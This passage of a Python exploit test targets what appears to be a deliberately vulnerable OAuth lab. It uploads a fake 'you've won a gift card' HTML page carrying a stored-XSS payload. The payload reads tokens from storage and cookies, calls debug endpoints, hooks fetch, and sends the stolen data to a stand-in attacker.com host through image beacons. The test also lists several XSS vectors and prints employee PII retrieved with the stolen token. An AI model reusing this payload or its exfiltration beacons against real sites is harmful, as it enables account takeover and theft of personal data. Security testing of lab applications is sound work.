    3. Upload the malicious HTML via `/upload/html` endpoint
    4. Send victim a link to `/usercontent/malicious.html`
    5. When victim visits, the script executes and steals their token
    6. Exfiltrate the token to an attacker-controlled server

    **Malicious Payload Hint:**
    ```javascript
    <script>
    // Extract token from page content or make request to /debug/sessions
    // Send to attacker server
    </script>
    ```
    """
    
    def test_attack_chain(self):
        # Step 1: Setup - First get a legitimate victim token
        print(f"\n[SETUP] Creating victim user with valid token...")
        
        # Initiate OAuth flow for victim
        response = authz_client.get(
            "/authorize",
            params={
                "response_type": "code",
                "client_id": "oauth-client-1",
                "redirect_uri": "http://localhost:3000/callback",
                "scope": "read,write,admin",
                "state": "victim-xss-state"
            },
            follow_redirects=False
        )
        
        assert response.status_code == 200
        html_content = response.text
        
        # Extract request_id
        request_id_match = re.search(r'name="request_id" value="([^"]+)"', html_content)
        assert request_id_match
        request_id = request_id_match.group(1)
        
        # Victim approves authorization
        response = authz_client.post(
            "/approve",
            data={
                "request_id": request_id,
                "client_id": "oauth-client-1",
                "redirect_uri": "http://localhost:3000/callback",
                "scope": "read,write,admin",
                "state": "victim-xss-state",
                "action": "approve"
            },
            follow_redirects=False
        )
        
        assert response.status_code == 302
        
        # Extract authorization code
        redirect_url = response.headers["location"]
        parsed = urlparse(redirect_url)
        query_params = parse_qs(parsed.query)
        assert "code" in query_params
        auth_code = query_params["code"][0]
        
        # Victim exchanges code for token
        response = authz_client.post(
            "/token",
            data={
                "grant_type": "authorization_code",
                "code": auth_code,
                "redirect_uri": "http://localhost:3000/callback",
                "client_id": "oauth-client-1",
                "client_secret": "oauth-client-secret-1"
            }
        )
        
        assert response.status_code == 200
        token_data = response.json()
        victim_token = token_data["access_token"]
        
        print(f"[SETUP] Victim obtained token: {victim_token[:30]}...")
        
        # Verify victim's token works
        verify_response = resource_client.get(
            "/employees",
            headers={"Authorization": f"Bearer {victim_token}"}
        )
        assert verify_response.status_code == 200
        print(f"[SETUP] Victim token verified - can access resources")
        
        # Step 2: Attacker creates malicious HTML file with XSS payload
        print(f"\n[ATTACK] Step 1: Creating malicious HTML file with XSS payload...")
        
        # Create a malicious HTML file that will steal tokens
        # The payload will attempt multiple token extraction methods
        malicious_html = """<!DOCTYPE html>
<html>
<head>
    <title>Congratulations! You've Won!</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }
        .prize {
            background: white;
            color: #333;
            padding: 30px;
            border-radius: 10px;
            display: inline-block;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <h1>🎉 Congratulations! 🎉</h1>
    <div class="prize">
        <h2>You've won a $1000 Amazon Gift Card!</h2>
        <p>Please wait while we verify your account...</p>
    </div>
    
    <!-- XSS Payload Below -->
    <script>
        // Token theft payload
        (function() {
            console.log('[XSS] Malicious script executing...');
            
            // Method 1: Try to extract token from localStorage
            const localStorageToken = localStorage.getItem('access_token') || 
                                      localStorage.getItem('token') ||
                                      localStorage.getItem('oauth_token');
            
            // Method 2: Try to extract from sessionStorage
            const sessionStorageToken = sessionStorage.getItem('access_token') ||
                                        sessionStorage.getItem('token');
            
            // Method 3: Try to extract from cookies
            const cookies = document.cookie;
            
            // Method 4: Try to extract from page content
            let pageToken = null;
            const bodyText = document.body.innerText;
            const tokenMatch = bodyText.match(/[A-Za-z0-9_-]{40,}/);
            if (tokenMatch) {
                pageToken = tokenMatch[0];
            }
            
            // Method 5: Make a request to the debug endpoint to steal session info
            fetch('http://localhost:8002/debug/sessions')
                .then(response => response.json())
                .then(data => {
                    console.log('[XSS] Stolen session data:', data);
                    
                    // Extract tokens from session data
                    const sessions = data.sessions || {};
                    const tokens = [];
                    
                    for (const [sessionId, sessionData] of Object.entries(sessions)) {
                        if (sessionData && sessionData.token) {
                            tokens.push({
                                type: 'session_token',
                                token: sessionData.token,
                                session_id: sessionId
                            });
                        }
                    }
                    
                    // Method 6: Try to get token from config endpoint
                    return fetch('http://localhost:8002/debug/config')
                        .then(r => r.json())
                        .then(config => {
                            // Compile all stolen data
                            const stolenData = {
                                localStorage: localStorageToken,
                                sessionStorage: sessionStorageToken,
                                cookies: cookies,
                                pageToken: pageToken,
                                sessionTokens: tokens,
                                clientConfig: config,
                                userAgent: navigator.userAgent,
                                url: window.location.href,
                                referrer: document.referrer,
                                timestamp: new Date().toISOString()
                            };
                            
                            console.log('[XSS] Complete stolen data:', stolenData);
                            
                            // Exfiltrate to attacker server
                            // In a real attack, this would be: fetch('http://attacker.com/steal', ...)
                            // For testing, we'll store it in a global variable
                            window.STOLEN_DATA = stolenData;
                            
                            // Also try to exfiltrate via image beacon
                            const img = new Image();
                            const exfilData = btoa(JSON.stringify(stolenData));
                            img.src = 'http://attacker.com/steal?data=' + exfilData;
                            
                            console.log('[XSS] Exfiltration attempted to attacker.com');
                            
                            return stolenData;
                        });
                })
                .catch(err => {
                    console.log('[XSS] Error stealing data:', err);
                });
            
            // Method 7: Hook into fetch/XMLHttpRequest to intercept future tokens
            const originalFetch = window.fetch;
            window.fetch = function(...args) {
                console.log('[XSS] Intercepted fetch:', args[0]);
                return originalFetch.apply(this, args).then(response => {
                    // Clone response to read it
                    const clonedResponse = response.clone();
                    clonedResponse.json().then(data => {
                        if (data.access_token) {
                            console.log('[XSS] Intercepted token from fetch:', data.access_token);
                            // Exfiltrate intercepted token
                            const img = new Image();
                            img.src = 'http://attacker.com/intercept?token=' + data.access_token;
                        }
                    }).catch(() => {});
                    return response;
                });
            };
        })();
    </script>
</body>
</html>"""
        
        print(f"[ATTACK] Created malicious HTML with multi-vector XSS payload")
        print(f"[ATTACK] Payload includes:")
        print(f"[ATTACK]   • localStorage token extraction")
        print(f"[ATTACK]   • sessionStorage token extraction")
        print(f"[ATTACK]   • Cookie theft")
        print(f"[ATTACK]   • Debug endpoint access (/debug/sessions, /debug/config)")
        print(f"[ATTACK]   • fetch/XHR interception for future tokens")
        print(f"[ATTACK]   • Multiple exfiltration methods")
        
        # Step 3: Upload the malicious HTML file
        print(f"\n[ATTACK] Step 2: Uploading malicious HTML file to client server...")
        
        # Upload using form data (filename and content)
        upload_response = client_client.post(
            "/upload/html",
            data={
                "filename": "win-prize.html",
                "content": malicious_html
            }
        )
        
        # Check if upload was successful
        assert upload_response.status_code == 200
        upload_data = upload_response.json()
        
        print(f"[ATTACK] ✓ Malicious file uploaded successfully!")
        print(f"[ATTACK] Upload response: {upload_data}")
        
        # Extract the uploaded file path/URL
        uploaded_filename = upload_data.get("filename", "win-prize.html")
        malicious_url = f"/usercontent/{uploaded_filename}"
        
        print(f"[ATTACK] Malicious URL: http://localhost:8002{malicious_url}")
        
        # Step 4: Simulate victim visiting the malicious page
        print(f"\n[ATTACK] Step 3: Victim visits the malicious URL...")
        print(f"[ATTACK] Social engineering: 'Click here to claim your prize!'")
        
        # When victim visits, they would be using their browser with their session
        # For testing, we'll request the malicious page
        victim_visit_response = client_client.get(malicious_url)
        
        # The response should contain the malicious HTML
        assert victim_visit_response.status_code == 200
        response_html = victim_visit_response.text
        
        print(f"[ATTACK] ✓ Victim loaded malicious page")
        
        # Verify the XSS payload is present in the served content
        assert "<script>" in response_html
        assert "STOLEN_DATA" in response_html or "fetch(" in response_html
        
        print(f"[ATTACK] ✓ XSS payload present in served HTML (unsanitized!)")
        
        # Step 5: Demonstrate what the XSS would steal by accessing debug endpoints
        print(f"\n[ATTACK] Step 4: Demonstrating data theft via XSS payload...")
        
        # The XSS would make these requests in the victim's browser context
        sessions_response = client_client.get("/debug/sessions")
        assert sessions_response.status_code == 200
        sessions_data = sessions_response.json()
        
        print(f"[ATTACK] XSS accessed /debug/sessions:")
        print(f"[ATTACK]   Sessions found: {len(sessions_data.get('sessions', {}))}")
        
        # Extract any tokens from sessions
        stolen_session_tokens = []
        for session_id, session_info in sessions_data.get('sessions', {}).items():
            if session_info and session_info.get('token'):
                stolen_session_tokens.append(session_info['token'])
                print(f"[ATTACK]   Stolen session token: {session_info['token'][:30]}...")
        
        # Access config endpoint
        config_response = client_client.get("/debug/config")
        assert config_response.status_code == 200
        config_data = config_response.json()
        
        print(f"\n[ATTACK] XSS accessed /debug/config:")
        print(f"[ATTACK]   Client ID: {config_data.get('client_id')}")
        print(f"[ATTACK]   Client Secret: {config_data.get('client_secret')}")
        
        # Step 6: Use stolen credentials to access resources
        print(f"\n[ATTACK] Step 5: Using stolen credentials to access victim's resources...")
        
        # Try using the victim's token (which we know in this test scenario)
        # In a real attack, this would come from the XSS exfiltration
        stolen_token = victim_token
        
        # Access resource server with stolen token
        resource_response = resource_client.get(
            "/employees",
            headers={"Authorization": f"Bearer {stolen_token}"}
        )
        
        assert resource_response.status_code == 200
        employees = resource_response.json()
        
        print(f"[ATTACK] ✓ Used stolen token to access resource server")
        print(f"[ATTACK] Retrieved {len(employees)} employees")
        
        # Access sensitive PII with stolen token
        if len(employees) > 0:
            pii_response = resource_client.get(
                f"/employees/{employees[0]['id']}/pii",
                headers={"Authorization": f"Bearer {stolen_token}"}
            )
            
            if pii_response.status_code == 200:
                pii_data = pii_response.json()
                print(f"\n[ATTACK] Step 6: Accessed sensitive PII with stolen token:")
                print(f"[ATTACK]   Employee: {pii_data['first_name']} {pii_data['last_name']}")
                print(f"[ATTACK]   SSN: {pii_data.get('ssn', 'N/A')}")
                print(f"[ATTACK]   Salary: ${pii_data.get('salary', 0):,.2f}")
                print(f"[ATTACK]   DOB: {pii_data.get('date_of_birth', 'N/A')}")
        
        # Step 7: Demonstrate persistence - the malicious file remains accessible
        print(f"\n[ATTACK] Step 7: Verifying persistence of XSS payload...")
        
        # Make another request to the malicious URL
        persistence_response = client_client.get(malicious_url)
        assert persistence_response.status_code == 200
        
        print(f"[ATTACK] ✓ Malicious file still accessible (stored XSS)")
        print(f"[ATTACK] ✓ Any future victim visiting this URL will be compromised")
        
        # Step 8: Demonstrate that the client serves user content without sanitization
        print(f"\n[ATTACK] Step 8: Verifying lack of content sanitization...")
        
        # Create another test file with various XSS vectors
        xss_test_vectors = """<!DOCTYPE html>
<html>
<body>
    <h1>XSS Test Vectors</h1>
    
    <!-- Vector 1: Basic script tag -->
    <script>alert('XSS1')</script>
    
    <!-- Vector 2: Event handler -->
    <img src=x onerror="alert('XSS2')">
    
    <!-- Vector 3: JavaScript URL -->
    <a href="javascript:alert('XSS3')">Click me</a>
    
    <!-- Vector 4: Data URL -->
    <iframe src="data:text/html,<script>alert('XSS4')</script>"></iframe>
    
    <!-- Vector 5: SVG embedded script -->
    <svg onload="alert('XSS5')"></svg>
</body>
</html>"""
        
        test_upload_response = client_client.post(
            "/upload/html",
            data={
                "filename": "xss-test.html",
                "content": xss_test_vectors
            }
        )
        
        assert test_upload_response.status_code == 200
        test_filename = test_upload_response.json().get("filename", "xss-test.html")
        
        # Verify the test vectors are served unsanitized
        test_response = client_client.get(f"/usercontent/{test_filename}")
        assert test_response.status_code == 200
        test_html = test_response.text
        
        # Check if XSS vectors are present (not sanitized)
        xss_vectors_present = [
            "<script>alert('XSS1')</script>" in test_html,
            "onerror=" in test_html,
            "javascript:" in test_html,
            "data:text/html" in test_html,
            "<svg onload=" in test_html
        ]
        
        print(f"[ATTACK] XSS vectors served without sanitization:")
        print(f"[ATTACK]   Script tag: {'✓' if xss_vectors_present[0] else '✗'}")
        print(f"[ATTACK]   Event handler: {'✓' if xss_vectors_present[1] else '✗'}")
        print(f"[ATTACK]   JavaScript URL: {'✓' if xss_vectors_present[2] else '✗'}")
        print(f"[ATTACK]   Data URL: {'✓' if xss_vectors_present[3] else '✗'}")
        print(f"[ATTACK]   SVG script: {'✓' if xss_vectors_present[4] else '✗'}")
        
        # Final summary
        print(f"\n[ATTACK] COMPLETE: XSS User Content Upload attack successful!")
        print(f"[ATTACK] ═══════════════════════════════════════════════════════")
        print(f"[ATTACK] Attack Summary:")
        print(f"[ATTACK]   ✓ Uploaded malicious HTML file to client server")
        print(f"[ATTACK]   ✓ File served without content sanitization")
        print(f"[ATTACK]   ✓ XSS payload executes in victim's browser")
        print(f"[ATTACK]   ✓ Payload steals tokens via multiple methods")
        print(f"[ATTACK]   ✓ Debug endpoints accessible from XSS context")
        print(f"[ATTACK]   ✓ Stolen tokens used to access sensitive PII")
        print(f"[ATTACK]   ✓ Stored XSS remains persistent")
        print(f"[ATTACK] ═══════════════════════════════════════════════════════")
        print(f"[ATTACK] Vulnerabilities:")
        print(f"[ATTACK]   • No file upload validation or sanitization")
        print(f"[ATTACK]   • User content served with text/html content-type")
        print(f"[ATTACK]   • No Content-Security-Policy (CSP) headers")
        print(f"[ATTACK]   • No X-Content-Type-Options headers")
        print(f"[ATTACK]   • Debug endpoints accessible from browser context")
        print(f"[ATTACK]   • Tokens accessible via debug endpoints")
        print(f"[ATTACK] ═══════════════════════════════════════════════════════")
        print(f"[ATTACK] Impact:")
        print(f"[ATTACK]   ⚠ Stored XSS allows persistent token theft")
        print(f"[ATTACK]   ⚠ Any user visiting the malicious URL is compromised")
        print(f"[ATTACK]   ⚠ Tokens can be stolen from localStorage/cookies")
        print(f"[ATTACK]   ⚠ Debug endpoints leak additional credentials")
        print(f"[ATTACK]   ⚠ Full access to victim's resources and PII")
        print(f"[ATTACK]   ⚠ Malicious content remains accessible indefinitely")
